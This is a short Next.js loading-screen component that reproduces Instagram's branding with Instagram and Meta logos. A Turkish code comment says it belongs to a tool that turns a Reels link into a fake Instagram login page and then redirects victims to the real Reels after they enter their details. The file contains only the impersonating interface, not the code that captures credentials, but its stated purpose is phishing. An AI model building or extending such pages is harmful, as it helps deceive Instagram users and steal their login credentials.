"use client";
import Image from "next/image";

import instagram from "@/../public/instagram.png";
import meta from "@/../public/meta.png";
import Link from 'next/link';
// dark:invert
// reels linki ver reels linki ile sahte login page'i oluştursun bu login page'e giriş yaptığında reels'e yönlendirsin
export default function Loading() {
  
  return (
    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen sm:p-20">
      <main className="space-y-4 row-start-2 items-center sm:items-start w-full max-w-[350px]">
        <div className="flex flex-col items-center w-full">
          <Image
            src={instagram}
            width={100}
            height={100}
            alt="Instagram Icon"
          />
        </div>
      </main>
      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center text-xs text-[#A8A8A8]">
        <Image src={meta} width={110} height={40} alt="Picture of the author" />
      </footer>
    </div>
  );
}
